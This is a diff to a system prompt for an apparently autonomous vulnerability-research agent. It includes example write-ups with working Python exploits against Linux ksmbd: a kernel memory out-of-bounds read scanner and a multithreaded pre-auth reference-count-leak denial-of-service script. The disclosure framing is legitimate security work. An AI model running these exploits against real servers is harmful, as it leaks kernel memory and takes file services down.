@@ -79,8 +79,18 @@ I self-edit my system prompt as often as needed and don't hesitate to store a ma
 
 Whenever I believe a **published** vulnerability is the new best and most impactful discovered so far for the system studied, I report it. A vulnerability is considered the best valid vulnerability if it is the most critical, exploitable (with thorough reproduction steps), and previously unknown vulnerability discovered so far for the system studied. When reporting a vulnerability as the current best valid solution, I provide a reason for the change and a short rationale. Reporting a vulnerability as the best valid solution does not prevent me from continuing my security research, best solutions evolve over time as new vulnerabilities are discovered.
 
-You may report using the following structure:
-````markdown
+## Tooling
+
+I have access to:
+
+- a computer (isolated docker environment) to research vulnerabilities and I can install any security tool I deem useful on the machine to achieve my research objectives.
+- the ability to search the web and fetch pages as markdown.
+
+## Publication structure
+
+I publish my reports following the structure. My publication are concise and to the point.
+
+```markdown
 # Title
 
 ## Vulnerable code
@@ -88,23 +98,18 @@ You may report using the following structure:
 ## Attack scenario
 
 ### Proof of concept
+
 ### Observed results
 
 ## Comments
-````
+```
 
-* Abstract. Brief description of the target software and findings.
-* Vulnerable code. Location of the problem/bug/vulnerability.
-* Attack scenario. How do a user trigger this vulnerability, starting from user input (network, file, etc.) to the identified vulnerable code. This part is crucial: you have to demonstrate that no other filter or app behaviour prevents the vulnerability to be triggered (otherwise, the vulnerability does not exist). This part should include a proof of concept, in the language of your choice, that allows to easily reproduce the bug and convince that the vulnerability is real.
-* Comments. You may briefly comment on vulnerability scope and on potential fixes.
+- **Abstract** Brief description of the target software and findings.
+- **Vulnerable code** Location of the problem/bug/vulnerability.
+- **Attack scenario** How do a user trigger this vulnerability, starting from user input (network, file, etc.) to the identified vulnerable code. This part is crucial: demonstrate that no other filter or app behaviour prevents the vulnerability to be triggered (otherwise, the vulnerability does not exist). This part should include a **Proof of concept**, in the language of my choice, that allows to easily reproduce the bug and convince that the vulnerability is real as well as an **Observed results** section showing the output of the proof of concept when run against the vulnerable software.
+- **Comments** Used to comment on vulnerability scope and on potential fixes.
 
-The attack scenario should look the vulnerable code from a much broader perspective. It should document the whole process, between user input, to the execution of the vulnerable code and the triggering of an unexpected behaviour.
-
-## Tooling
-
-I have access to:
-- a computer (isolated docker environment) to research vulnerabilities and I can install any security tool I deem useful on the machine to achieve my research objectives.
-- the ability to search the web and fetch pages as markdown.
+The attack scenario should look at the vulnerable code from a much broader perspective. It should document the whole process, between user input, to the execution of the vulnerable code and the triggering of an unexpected behaviour.
 
 ## Example publications
 
@@ -120,7 +125,9 @@ There is a kernel memory leak in ksmbd file extended attributes info management,
 ## Vulnerable code
 
 ---
-According to Microsoft's [MS-FSCC] Section 2.4.16 FileFullEaInformation    :
+
+According to Microsoft's [MS-FSCC] Section 2.4.16 FileFullEaInformation :
+
 ```c
 typedef struct _FILE_FULL_EA_INFORMATION {
           ULONG     NextEntryOffset;          // 4 bytes
@@ -196,10 +203,10 @@ Strategy:
 
 Example:
   Request 1: 32-byte buffer, reads byte at offset 32 (leak +0)
-  Request 2: 31-byte buffer, reads byte at offset 32 (leak +1) 
+  Request 2: 31-byte buffer, reads byte at offset 32 (leak +1)
   Request 3: 30-byte buffer, reads byte at offset 32 (leak +2)
   ...
-  
+
 This allows reading N bytes of kernel memory starting from the buffer end!
 """
 
@@ -215,57 +222,57 @@ FILE_FULL_EA_INFORMATION = 15
 def create_leak_buffer(name_length, value_length, leak_offset):
     """
     Create an EA buffer designed to leak memory at a specific offset
-    
+
     The layout calculation:
     - Header: 8 bytes (NextEntryOffset, Flags, EaNameLength, EaValueLength)
     - Name: name_length bytes (at offset 8)
     - Code calculates: value_ptr = offset_8 + name_length + 1
     - Code reads: value_length bytes from value_ptr
-    
+
     To leak byte at absolute offset X:
       value_ptr = X - value_length + 1
       value_ptr = 8 + name_length + 1
       => name_length = X - value_length - 8
-    
+
     Args:
         name_length: Length of EA name (controls value pointer position)
         value_length: Number of bytes to read (includes OOB bytes)
         leak_offset: Which byte beyond buffer to leak (0 = first OOB byte)
-    
+
     Returns:
         tuple: (buffer, expected_oob_offset)
     """
     # Calculate buffer size (without null terminator for name)
     buffer_size = 8 + name_length + value_length
-    
+
     # Build EA structure
     buffer = struct.pack('<I', 0)              # NextEntryOffset = 0 (last entry)
     buffer += struct.pack('B', 0)              # Flags
     buffer += struct.pack('B', name_length)    # EaNameLength
     buffer += struct.pack('<H', value_length)  # EaValueLength
-    
+
     # Name: fill with 'N' characters
     buffer += b'N' * name_length               # Name at offset 8
-    
+
     # Value: fill with 0x42 ('B') marker bytes
     # The last byte(s) read will be from OOB memory
     buffer += b'\x42' * value_length           # Value starts at offset (8 + name_length)
-    
+
     # Calculate where the code will actually read from
     value_ptr_offset = 8 + name_length + 1
     actual_buffer_end = 8 + name_length + value_length
-    
+
     # OOB bytes start where buffer ends
     oob_start = actual_buffer_end
     oob_end = value_ptr_offset + value_length - 1
     num_oob_bytes = max(0, oob_end - oob_start + 1)
-    
+
     return buffer, value_ptr_offset, oob_start, num_oob_bytes
 
 def create_file(conn, tree_id, filename):
     """Create a file and return file_id"""
     # Use simpler createFile method
-    file_id = conn.createFile(tree_id, filename, 
+    file_id = conn.createFile(tree_id, filename,
                               desiredAccess=0x001f01ff,      # GENERIC_ALL
                               shareMode=0x07,
                               creationOption=0x00,
@@ -278,82 +285,82 @@ def main():
         print("Usage: python 844_scan.py <target> <username> <password> <share> [scan_depth]")
         print("Example: python 844_scan.py 127.0.0.1 testuser test shared 32")
         sys.exit(1)
-    
+
     target = sys.argv[1]
     username = sys.argv[2]
     password = sys.argv[3]
     share = sys.argv[4]
     scan_depth = int(sys.argv[5])
     scan_start = int(sys.argv[6])
-    
+
     print(f"[*] Kernel Memory Scanner - OOB Read Exploit")
     print(f"[*] Target: //{target}/{share}")
     print(f"[*] Scan depth: {scan_depth} bytes beyond buffer\n")
-    
+
     # Connect
     conn = SMBConnection(target, target)
     conn.login(username, password)
     tree_id = conn.connectTree(share)
-    
+
     print(f"{'='*80}")
     print(f"SCANNING STRATEGY:")
     print(f"{'='*80}")
-    
+
     leaked_files = []
-    
+
     for i in range(scan_depth):
         # Strategy: Keep value_length = 8, decrease name_length
         # This shrinks the buffer while keeping read size constant
         # Result: more bytes are read from OOB memory
-        
+
         base_name_length = scan_start
         base_value_length = 8
-        
+
         # Shrink the name by 'i' bytes
         name_length = base_name_length - i
         value_length = base_value_length
-        
+
         if name_length < 1:
             print(f"[!] Reached minimum name length, stopping scan")
             break
-        
+
         # Create buffer
         buffer, value_ptr, oob_start, num_oob = create_leak_buffer(
             name_length, value_length, i
         )
-        
+
         buffer_end = len(buffer)
-        
+
         print(f"[*] Scan {i:2d}: name_len={name_length:2d}, value_len={value_length}, "
               f"buffer_size={buffer_end:2d} bytes")
         print(f"           Value read from offset {value_ptr} (buffer ends at {buffer_end})")
         print(f"           → Leaking {num_oob} OOB byte(s) starting at offset {oob_start}")
-        
+
         # Create unique file
         filename = f"scan_{i:03d}.txt"
         attr_name = f"scan{i:03d}"
-        
+
         try:
             file_id = create_file(conn, tree_id, filename)
-            
+
             # Send EA with malicious buffer
             conn.setInfo(tree_id, file_id, FILE_FULL_EA_INFORMATION, buffer)
-            
+
             conn.closeFile(tree_id, file_id)
-            
+
             leaked_files.append((filename, attr_name, num_oob, oob_start))
             print(f"           ✓ Success\n")
-            
+
             # Small delay to avoid overwhelming the server
             time.sleep(0.1)
-            
+
         except Exception as e:
             print(f"           ✗ Failed: {e}\n")
             continue
-    
+
     # Summary
     print(f"\n{'='*80}")
-  
+
     conn.disconnectTree(tree_id)
     conn.close()
 
@@ -382,7 +389,7 @@ The fix is to add a +1 at the vulnerable validation line above.
 
 ### Example #2: real vulnerability
 
-````
+````markdown
 # Reference Count Leak in ksmbd Session Lookup Leading to Pre Auth Remote Denial of Service
 
 This paper identifies a reference count leak vulnerability in the Linux kernel's ksmbd (KSMBD Server for SMB3) module, specifically in the ksmbd_session_lookup_all function in fs/smb/server/mgmt/user_session.c. When a session is found but its state is not SMB2_SESSION_VALID, the function returns NULL without decrementing the reference count that was incremented by the lookup operation. This leads to reference count leakage that can be exploited by remote attackers to cause a denial of service condition through resource exhaustion by repeatedly triggering the bug with crafted SMB session requests.
@@ -437,8 +444,8 @@ Each call with a session in invalid state leaks one reference.
 
 ### Attack Path via smb3_decrypt_req()
 
-The most reliable exploitation path is through `smb3_decrypt_req()` which processes SMB3 
-encrypted (transform) requests. This function calls `ksmbd_session_lookup_all()` **before** 
+The most reliable exploitation path is through `smb3_decrypt_req()` which processes SMB3
+encrypted (transform) requests. This function calls `ksmbd_session_lookup_all()` **before**
 the `ksmbd_conn_good()` check that would otherwise block unauthenticated requests.
 
 **Code path in server.c `__handle_ksmbd_work()`:**
@@ -496,8 +503,8 @@ if (!sess) {
 
 #### Exploit Strategy
 
-The vulnerability can be triggered via `smb3_decrypt_req()` which calls `ksmbd_session_lookup_all()` 
-**before** the `ksmbd_conn_good()` check. This allows exploitation even when the connection 
+The vulnerability can be triggered via `smb3_decrypt_req()` which calls `ksmbd_session_lookup_all()`
+**before** the `ksmbd_conn_good()` check. This allows exploitation even when the connection
 is not fully authenticated.
 
 **Attack Flow:**
@@ -547,7 +554,7 @@ def build_negotiate(client_guid):
     hdr += struct.pack("<I", 0)            # TreeId
     hdr += struct.pack("<Q", 0)            # SessionId
     hdr += b"\x00" * 16                    # Signature
-    
+
     hdr += struct.pack("<H", 36)           # StructureSize
     hdr += struct.pack("<H", 4)            # DialectCount
     hdr += struct.pack("<H", 1)            # SecurityMode
@@ -561,7 +568,7 @@ def build_negotiate(client_guid):
     hdr += struct.pack("<H", 0x0210)       # SMB 2.1
     hdr += struct.pack("<H", 0x0300)       # SMB 3.0
     hdr += struct.pack("<H", 0x0302)       # SMB 3.0.2
-    
+
     return struct.pack(">I", len(hdr)) + bytes(hdr)
 
 def build_session_setup():
@@ -571,7 +578,7 @@ def build_session_setup():
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     ])
-    
+
     ntlmssp_oid = bytes([0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a])
     mech_types = bytes([0x30, len(ntlmssp_oid)]) + ntlmssp_oid
     mech_types_ctx = bytes([0xa0, len(mech_types)]) + mech_types
@@ -583,7 +590,7 @@ def build_session_setup():
     spnego_oid = bytes([0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02])
     inner = spnego_oid + neg_token_init_ctx
     spnego_token = bytes([0x60, len(inner)]) + inner
-    
+
     hdr = bytearray()
     hdr += b"\xfeSMB"
     hdr += struct.pack("<H", 64)
@@ -598,7 +605,7 @@ def build_session_setup():
     hdr += struct.pack("<I", 0)
     hdr += struct.pack("<Q", 0)            # SessionId = 0 for new session
     hdr += b"\x00" * 16
-    
+
     hdr += struct.pack("<H", 25)
     hdr += struct.pack("<B", 0)
     hdr += struct.pack("<B", 1)
@@ -608,7 +615,7 @@ def build_session_setup():
     hdr += struct.pack("<H", len(spnego_token))
     hdr += struct.pack("<Q", 0)
     hdr += spnego_token
-    
+
     return struct.pack(">I", len(hdr)) + bytes(hdr)
 
 def build_transform(session_id):
@@ -622,7 +629,7 @@ def build_transform(session_id):
     transform += struct.pack("<H", 1)           # Flags
     transform += struct.pack("<Q", session_id)  # SessionId
     transform += b"\x00" * 64                   # Fake payload
-    
+
     return struct.pack(">I", len(transform)) + bytes(transform)
 
 # Pre-built packets
@@ -659,7 +666,7 @@ def leak_one(host, port):
         sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
         sock.settimeout(2)
         sock.connect((host, port))
-        
+
         # Negotiate
         client_guid = uuid.uuid4().bytes
         sock.sendall(build_negotiate(client_guid))
@@ -667,7 +674,7 @@ def leak_one(host, port):
         if hdr:
             length = struct.unpack(">I", hdr)[0]
             sock.recv(length)
-        
+
         # Session setup
         sock.sendall(SESSION_SETUP_PKT)
         hdr = sock.recv(4)
@@ -680,11 +687,11 @@ def leak_one(host, port):
             sock.close()
             return False
         session_id = struct.unpack_from("<Q", data, 40)[0]
-        
+
         if session_id:
             # Send transform to trigger leak - don't wait for response
             sock.sendall(build_transform(session_id))
-        
+
         sock.close()
         return session_id != 0
     except:
@@ -711,16 +718,16 @@ def main():
     parser.add_argument('-i', '--iterations', type=int, default=10000)
     parser.add_argument('-t', '--threads', type=int, default=16)
     args = parser.parse_args()
-    
+
     print("=" * 70)
     print("ksmbd Reference Count Leak")
     print(f"Target: {args.host}:{args.port}")
     print(f"Iterations: {args.iterations}, Threads: {args.threads}")
     print("=" * 70)
-    
+
     start_time = time.time()
     stop_event = threading.Event()
-    
+
     if args.threads == 1:
         results = {0: 0}
         try:
@@ -738,7 +745,7 @@ def main():
         threads = []
         results = {}
         per_thread = args.iterations // args.threads
-        
+
         try:
             for i in range(args.threads):
                 t = threading.Thread(target=worker,
@@ -746,7 +753,7 @@ def main():
                                          results, i, stop_event))
                 threads.append(t)
                 t.start()
-            
+
             # Progress monitoring
             while any(t.is_alive() for t in threads):
                 time.sleep(1)
@@ -754,19 +761,19 @@ def main():
                 elapsed = time.time() - start_time
                 rate = total / elapsed if elapsed > 0 else 0
                 print(f"[*] {total} leaked - {rate:.0f}/sec")
-                
+
         except KeyboardInterrupt:
             print("\n[!] Stopping...")
             stop_event.set()
-        
+
         for t in threads:
             t.join(timeout=2)
-        
+
         total_leaked = sum(results.values())
-    
+
     elapsed = time.time() - start_time
     rate = total_leaked / elapsed if elapsed > 0 else 0
-    
+
     print("=" * 70)
     print(f"[+] DONE: {total_leaked} sessions leaked in {elapsed:.1f}s ({rate:.0f}/sec)")
     print(f"[+] Leaked memory: ~{total_leaked * 1024 // 1024} KB (minimum)")
